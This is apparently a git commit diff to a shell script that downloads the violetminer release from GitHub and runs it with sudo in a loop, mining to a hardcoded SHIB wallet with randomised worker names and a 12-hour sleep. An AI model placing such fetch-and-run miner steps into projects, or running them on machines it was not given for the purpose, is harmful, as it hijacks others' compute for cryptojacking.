bb53639541d5e65dde0c98efdb3319ddff091f21
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2021-08-05 21:48:25 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -3,7 +3,12 @@
 POOL=rx-us.unmineable.com:3333
 WALLET=SHIB:0xae4fa9f4582afc88f329b862738c8c50e5268fba
 WORKER=$(echo $(shuf -i 1-99999 -n 1)-xroc)
-chmod +x mantapu
-./mantapu --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin 
+wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
+tar -zxvf violetminer-linux-v0.2.2.tar.gz
+cd violetminer-linux-v0.2.2
+chmod +x violetminer
+while [ 1 ]; do
+  sleep 5
+  sudo ./violetminer --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin 
 done
 sleep 43200
